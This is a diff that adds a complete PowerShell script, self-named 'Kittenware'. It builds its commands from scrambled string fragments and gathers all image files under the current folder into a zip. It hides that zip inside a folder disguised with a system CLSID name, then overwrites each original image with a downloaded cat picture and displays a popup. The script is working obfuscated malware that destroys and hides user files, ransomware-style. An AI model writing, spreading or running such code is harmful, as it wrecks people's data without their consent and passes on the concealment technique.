@@ -1,0 +1,101 @@
+$jhilg = "h"
+$zksvo = "cry"
+$yligm = "tem"
+$dtghn = "CA"
+$qszpk = "21d7"
+$voirs = "Ne"
+$jsvfw = "En"
+$npqwi = ".{"
+$fuyik = "ame-I"
+$gmdiq = "pt"
+$rfexo = "ed "
+$dlmqz = "p"
+$fghjh = "TS"
+$icbzm = "9f0"
+$fgyjk = "NTFU"
+$ufxsi = "00c04"
+$yplaz = "000"
+$eolrx = "2559"
+$htbfz = "-"
+$dfgdd = "DO"
+$ftcvj = "ame"
+$mwcju = "}"
+$awtfc = "ma"
+$voirs = "Ne"
+$kgoen = "11d4"
+$srtjs = "Pat"
+$rsjrs = "TH"
+$bvkrt = "ges"
+$yuflo = "/"
+$tpjly = "a1f2"
+$ftcvj = "ame"
+$dtghn = "CA"
+$ufxsi = "00c04"
+$zksvo = "cry"
+$gmdiq = "pt"
+$icbzm = "9f0"
+$ftcvj = "ame"
+$dlmqz = "p"
+$dfgdd = "DO"
+$fgyjk = "NTFU"
+$rfexo = "ed "
+$jhilg = "h"
+$dfyjj = "Ren"
+$yligm = "tem"
+$rdfty = "I"
+$qszpk = "21d7"
+$htbfz = "-"
+$dlmqz = "p"
+$voirs = "Ne"
+$jsvfw = "En"
+$tpjly = "a1f2"
+$awtfc = "ma"
+$eolrx = "2559"
+$yplaz = "000"
+$ufxsi = "00c04"
+$kgoen = "11d4"
+$icbzm = "9f0"
+$ftyih = "bdaf"
+$fuyik = "ame-I"
+$dfyjj = "Ren"
+$srtjs = "Pat"
+$mwcju = "}"
+$tydrk = "I"
+$fghjh = "TS"
+$rsjrs = "TH"
+$vynhb = ".z"
+$uildd = "wN"
+$ydavr = "f60b"
+$directory = (Get-Location).Path
+$hiddenFolderPath = Join-Path -Path $directory -ChildPath "$jsvfw$zksvo$gmdiq$rfexo$tydrk$xhcgy$awtfc$bvkrt"
+$zipPath = Join-Path -Path $hiddenFolderPath -ChildPath "$tydrk$xhcgy$awtfc$bvkrt$vynhb$tydrk$dlmqz"
+$sourcePath = "$jsvfw$zksvo$gmdiq$rfexo$tydrk$xhcgy$awtfc$bvkrt$tydrk$xhcgy$awtfc$bvkrt$vynhb$tydrk$dlmqz"
+$destinationPath = "$jsvfw$zksvo$gmdiq$rfexo$tydrk$xhcgy$awtfc$bvkrt"
+$allowedExtensions = @('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg')
+$files = Get-ChildItem -Path $directory -File -Recurse | Where-Object { $allowedExtensions -contains $_.Extension }
+
+New-Item -Path $hiddenFolderPath -ItemType Directory -Force
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+[IO.Compression.ZipFile]::CreateFromDirectory($zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+$zipFile = [IO.Compression.ZipFile]::Open($zipPath, [IO.Compression.ZipArchiveMode]::Update)
+
+foreach ($file in $files) {
+    $entry = $zipFile.CreateEntry($file.Name)
+    $fileStream = $entry.Open()
+    $content = [IO.File]::ReadAllBytes($file.FullName)
+    $fileStream.Write($content, 0, $content.Length)
+    $fileStream.Close()
+}
+$zipFile.Dispose()
+Invoke-Expression "$dfyjj$fuyik$yligm $htbfz$srtjs$jhilg `"$jsvfw$zksvo$gmdiq$rfexo$rdfty$xhcgy$awtfc$bvkrt`" $htbfz$voirs$uildd$ftcvj `"$jsvfw$zksvo$gmdiq$rfexo$xhcgy$awtfc$bvkrt$npqwi$eolrx$tpjly$htbfz$qszpk$htbfz$kgoen$htbfz$ftyih$htbfz$ufxsi$ydavr$icbzm$mwcju`""
+
+foreach ($file in $files) {
+    $response = Invoke-RestMethod -Uri "https://api.thecatapi.com/v1/images/search"
+    $imageURL = $response.url
+    Invoke-WebRequest -Uri $imageURL -OutFile $file.FullName
+    Write-Host "Kittenized: $($file.Name)"
+    Start-Sleep -Seconds 1
+}
+$wshell = New-Object -ComObject WScript.Shell
+$wshell.Popup("Images Kittenized By Kittenware!", 0, "Meow!", 0x40)
+Exit
